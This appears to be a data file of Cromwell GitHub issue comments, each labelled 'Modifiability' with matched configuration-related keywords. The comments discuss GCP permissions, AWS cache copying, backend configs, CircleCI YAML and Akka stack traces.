Modifiability,"for query I'd expect for it to typically be measured in seconds, not minutes and certainly not longer than that, it's just that we don't make any guarantee that the data is in there before we move on. For the metadata endpoint there's a summarization process which happens (to make the response time faster) that sweeps around every few minutes (rate is configurable) and calculates the current state of the world",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267738860:354,config,configurable,354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267738860,1,['config'],['configurable']
Modifiability,"g to add role `storage.objects.create` it errors out with:; ```; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleCon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2567,config,configuration,2567,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,2,['config'],['configuration']
Modifiability,"he copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1733,config,config,1733,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['config'],['config']
Modifiability,"hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1103,adapt,adapted,1103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550,1,['adapt'],['adapted']
Modifiability,"hey @jainh -- Building on @geoffjentry 's question, and after reading through the code here... I'm not sure what about this PR is actually Spark'ified. It seems like a copy and paste of the HtCondor backend (including some variable names!) and then using that to run a command inside a docker to connect to a pre-existing spark cluster with preloaded data. All this could already be done using any one of the docker-based back ends (e.g. Local or even Google). Am I missing something here? If not, it would be great to see more of a roadmap about where you see this going because it's not clear from the code here what direction it could take. The concept of running/orchestrating Spark jobs via Cromwell is an important one and could take many, many forms so clarifying which approach this is taking (and making that clear in naming/location/etc) is important. Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-231173340:223,variab,variable,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-231173340,1,['variab'],['variable']
Modifiability,"hey @kshakir ! I'm definitely glad to help. I'm not sure a remote session would be helpful to understand yaml - it's a data structure like json, and just a way to capture a workflow. I'd be happy to answer specific questions that you might have, feel free to post them on here, and no worries about the busy-ness! I hope the :fire: calms down, at least it has been sort of not so great for CA! If it helps, I'll leave you some notes here:. - adding this circle testing doesn't interfere with your current testing; - adding the build and deploy of the docker container here is a better strategy than having travis handle everything because the two can run at the same time.; - environment variables, given docker credentials, are set on the circleci project backend (once and forgotten about). This is mostly just DOCKER for pushing to docker hub.; - The yaml uses [anchors](https://discuss.circleci.com/t/using-defaults-syntax-in-config-yaml-aka-yaml-anchors/16168) in the configuration like functions, and to pipe in defaults. I name them according to what they do (e.g., `dockersave`. Some quick learnings:. Let's say we create a defaults section that looks like this, to set some shared environment variables, working directory, docker container, anything we want really:. ```; defaults: &defaults; docker:; - image: docker:18.01.0-ce-git; working_directory: /tmp/src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The ma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:688,variab,variables,688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,3,"['config', 'variab']","['config-yaml-aka-yaml-anchors', 'configuration', 'variables']"
Modifiability,"host/port is nice when you think about autoscaling. having the config file need to be different on every machine will be a headache when you want an ELB to spin up more nodes based on load. in a non-container world, that's straightforward. In a container world, the hostname (as defined by /etc/hostname, which is what typical java apis use to determine hostname) is set to a unique container id. So even if you're running multiple containers on the same host on the same port (pre-NAT) you'll get unique IDs. ```; wm80b-899:~ $ echo $HOSTNAME; wm80b-899; wm80b-899:~ $ docker run -it ubuntu /bin/bash -i; root@62d62e5dc805:/# echo $HOSTNAME; 62d62e5dc805; root@62d62e5dc805:/# cat /etc/hostname; 62d62e5dc805; root@62d62e5dc805:/# ; ```. @jacmrob",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371247207:63,config,config,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371247207,1,['config'],['config']
Modifiability,https://broadinstitute.atlassian.net/plugins/servlet/mobile#issue/GAWB-4001 for Workbench tracking.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-439615659:37,plugin,plugins,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-439615659,1,['plugin'],['plugins']
Modifiability,https://hub.docker.com/layers/broadinstitute/cromwell/49-aa5dd9b-SNAP/images/sha256-65a104b766da0ee6f96243d28579531114ea2fee8542ef34f62fc0ea09bf4e6a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5391#issuecomment-578991896:23,layers,layers,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5391#issuecomment-578991896,1,['layers'],['layers']
Modifiability,https://hub.docker.com/layers/broadinstitute/cromwell/49-c58d88c-SNAP/images/sha256-e0cf331faa3486a9d4d6a19d26da0facc11c039dd2d2f6383ed3042e73187ca9,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5389#issuecomment-578990336:23,layers,layers,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5389#issuecomment-578990336,1,['layers'],['layers']
Modifiability,"ibing the configuration file for PAPIv1, neither states this simple fact about Requester Pays not working with PAPIv1 nor links to the useful [page](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) you mentioned. I have now switched to the [PAPIv2.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/PAPIv2.conf) configuration file which does not contain the important piece of configuration code:; ```; engine {; filesystems {; gcs {; auth = ""application-default""; project = ""<google-billing-project-id>""; }; }; }; ```; This was in the google.conf PAPIv1 configuration file. I guess somehow it did not make it in the PAPIv2 configuration file and users reading the tutorial have the guess that on their own. Now the Requester Pays issue is gone as I get lines like this in the logs instead:; ```; 2020/07/28 21:30:48 rm -f $HOME/.config/gcloud/gce && gsutil -h ""Content-Type: text/plain; charset=UTF-8"" cp /google/logs/output gs://xxx/Mutect2/74c8be5e-f988-49b0-a51d-c87f2ac7cb60/call-TumorCramToBam/TumorCramToBam.log failed; BadRequestException: 400 Bucket is requester pays bucket but no user project provided.; 2020/07/28 21:30:48 Retrying with user project; Copying file:///google/logs/output [Content-Type=text/plain; charset=UTF-8]...; ```; At least that's fully clarified. However I still get the error:; ```; 2020/07/28 21:30:43 Localizing input gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram -> /cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram; Error attempting to localize file with command: 'mkdir -p '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885:1028,config,config,1028,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885,1,['config'],['config']
Modifiability,"icate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: ChangeSet metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96823,config,configured,96823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3830,Config,ConfigWdlNamespace,3830,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigWdlNamespace']
Modifiability,if you had to update the Cromwell server repo template for the `CROMWELL_BUILD_CENTAUR_256_BITS_KEY` variable could you please include those changes?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739:101,variab,variable,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6486#issuecomment-914482739,1,['variab'],['variable']
Modifiability,"imported and/or stored a number of places, including ~JES~ PAPI, MySQL, etc. I've frequently seen millisecond format differences when the formatter truncates the zero milliseconds. In the example above there appears to be a difference between [`start`](https://github.com/broadinstitute/cromwell/blob/2caec7d3fb24cef6e9e1fd1d3f89f6504f48dda8/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowMetadataHelper.scala#L15) vs. [`end`](https://github.com/broadinstitute/cromwell/blob/2caec7d3fb24cef6e9e1fd1d3f89f6504f48dda8/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowMetadataHelper.scala#L20)/[`submission`](https://github.com/broadinstitute/cromwell/blob/2caec7d3fb24cef6e9e1fd1d3f89f6504f48dda8/engine/src/main/scala/cromwell/engine/workflow/workflowstore/WorkflowStoreSubmitActor.scala#L111), ex: `""2017-09-15T01:50:58Z""` vs `""2017-09-15T01:50:58.000Z""`. Each is actually generated the same way using `OffsetDateTime.now.toString`. For timezone differences, I'm a little less sure without more context. I believe most (all?) google dates come back as UTC. But it's possible one may run cromwell on a JVM using a [default offset](https://docs.oracle.com/javase/8/docs/api/java/util/TimeZone.html#getDefault--), producing some `OffsetDateTime.now` with `-07:00`. This is especially the case for dates stored in database `TIMESTAMP` columns, as we use the zone of _cromwell_ before [stripping the zone](https://github.com/broadinstitute/cromwell/blob/2caec7d3fb24cef6e9e1fd1d3f89f6504f48dda8/database/sql/src/main/scala/cromwell/database/sql/SqlConverters.scala#L9-L19) and sending the datetime over to the db. A possible fix to this whole issue would be to feed all `OffsetDateTime`s through a function that, for example, does `.withNano(0).atZoneSameInstant(ZoneOffset.UTC)`, if that's what we want to do. Perhaps the ZoneOffset could be configurable, as I've heard cromwell users mentioning trouble doing the date math when staring at UTC times.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2743#issuecomment-342169064:2011,config,configurable,2011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2743#issuecomment-342169064,1,['config'],['configurable']
Modifiability,"in the expected directory. - Based on my initial incorrect understanding, I then believed if I couldn't get the containerId, then how would Cromwell know that the job has actually finished. ### My additional errors. These tended to redirect me away from the actual misunderstanding. . 1. In the udocker config I [posted before](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364) (corrected with comment), I was accidentally providing the `--entry-point` param, which was causing an interactive shell to open, stopping the rest of the script from executing. 2. I failed to notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2287,config,config,2287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['config']
Modifiability,"int-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleConfigurationSpec.scala) it should be defined as:; ```; {; name = ""user-account""; scheme = ""user_account""; user = ""me""; secrets-file = ""/very/secret/file.txt""; data-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2791,config,configuration,2791,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,1,['config'],['configuration']
Modifiability,ion.TraversableOnce.toList(TraversableOnce.scala:294); 	at scala.collection.TraversableOnce.toList$(TraversableOnce.scala:294); 	at scala.collection.AbstractTraversable.toList(Traversable.scala:104); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4(EcmaScriptUtil.scala:111); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4$adapted(EcmaScriptUtil.scala:107); 	at scala.collection.MapLike$MappedValues.$anonfun$foreach$3(MapLike.scala:253); 	at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 	at scala.collection.immutable.Map$Map2.foreach(Map.scala:146); 	at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$evalExpression$1(ExpressionEvaluator.scala:43); 	at cwl.ExpressionInterpolator$.interpolate(ExpressionInterpolator.scala:140); 	at cwl.ExpressionEvaluator$.evalExpression(ExpressionEvaluator.scala:43); 	at cwl.EvaluateExpression$.$anonfun$script$2(EvaluateExpression.scala:11); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:35); 	at cwl.CommandLineBindingCommandPart.$anonfun$instantiate$5(CwlExpressionCommandPart.scala:79); 	at scala.Option.flatMap(Option.scala:171); 	at cwl.CommandLineBindingCommandPart.instantiate(CwlExpressionCommandPart.scala:78); 	at wom.callable.CommandTaskDefinition.$anonfun$instantiateCommand$3(CommandTaskDefinition.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:2726,Enhance,EnhancedRhinoSandbox,2726,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['Enhance'],['EnhancedRhinoSandbox']
Modifiability,ionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.ba,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1633,Config,ConfigAsyncJobExecutionActor,1633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"irectory, take the generated qsub command and try it on your cluster. Hopefully you get the same ""Illegal attribute"" error. Play around with the command until you get the correct syntax. From there we can get your Cromwell config setup such it transforms the `memory` attribute into a valid syntax. Some possible examples:. | Example qsub usage | Runtime Attribute | Description |; |------------------------|------------------------|-------------------------------------------------------------------------------------------------|; | `qsub -l mem=4.0GB …` | `Float memory_gb = 1` | decimal values allowed, units are two characters uppercase |; | `qsub -l mem=4g …` | `Int memory_gb = 1` | integer values only, no decimals, and units must be one character lowercase |; | `qsub -l mem=4000mb …` | `Int memory_mb = 1000` | integer values only, and it turns out gigabytes aren't even allowed as a unit, so use megabytes |. > I would like to use $PROJECT environment variable as the default value for raijin_project_id. Environment variables won't work within HOCON, but can be passed through down into the generated submit files. It will take a bit of escaping to get past 